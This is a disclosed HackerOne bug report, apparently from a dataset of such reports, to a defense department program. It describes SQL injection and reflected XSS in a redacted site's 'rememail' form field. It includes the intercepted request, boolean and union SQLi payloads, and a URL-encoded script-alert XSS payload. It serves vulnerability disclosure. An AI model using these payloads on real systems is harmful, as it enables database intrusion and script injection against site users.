---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '484801'
original_report_id: '484801'
title: '[███]  SQL injection & Reflected XSS'
weakness: SQL Injection
team_handle: deptofdefense
created_at: '2019-01-23T21:08:17.063Z'
disclosed_at: '2019-12-02T19:11:46.642Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 8
tags:
- hackerone
- sql-injection
---

# [███]  SQL injection & Reflected XSS

## Metadata

- HackerOne Report ID: 484801
- Weakness: SQL Injection
- Program: deptofdefense
- Disclosed At: 2019-12-02T19:11:46.642Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

###SQL injection test###

1. Go to site [███████](http://█████/)
2. Intercept this request

```
POST /viewem6.php HTTP/1.1
Host: ████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://████████/
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Connection: close
Upgrade-Insecure-Requests: 1

rememail=test&rememail2=test
```
Set this payload to param ```rememail```

```
' or '1'='1
```

or 
```
' or true --+
```
█████████
█████████

But if you set another payload 
```
' or '1'='2
```

or 
```
' or false --+
```

██████████
███████

Also if you set payload
```
' union select 1--
```

You will have another request
█████

I did not begin to extract any data about the server or database, since this may be contrary to the rules.

###Reflected XSS###

Using this payload I can execute XSS

```
' or '"<script>alert(1)</script>'='"<script>alert(1)</script>
```

You need to encode this payload

```
%27 or %27"<script>alert(1)</script>%27=%27"<script>alert(1)</script>
```

Result in Burp
█████

## Impact

Using this bug hacker can get access to database of server, also hacker can exploit XSS injection.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
